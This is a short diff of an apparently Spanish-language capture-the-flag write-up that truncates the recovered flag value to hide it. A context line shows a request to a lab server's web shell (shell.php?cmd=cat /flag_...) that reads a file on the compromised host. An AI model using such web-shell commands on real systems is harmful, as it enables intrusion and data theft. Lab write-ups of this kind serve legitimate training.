@@ -552,10 +552,10 @@ http://94.237.57.108:31396/dashboard/shell.php?cmd=cat /flag_cae1dadcd174.txt
 **Resultado**:
 
 ```
-528d6d9cedc2c7aab146ef226e918396
+528d6d9cedc2c7aab14...
 ```
 
-**Flag**: `528d6d9cedc2c7aab146ef226e918396`
+**Flag**: `528d6d9cedc2c7aab14...`
 
 **Explicación**: Leer directamente el archivo de la bandera confirma la explotación completa y el objetivo alcanzado.
 
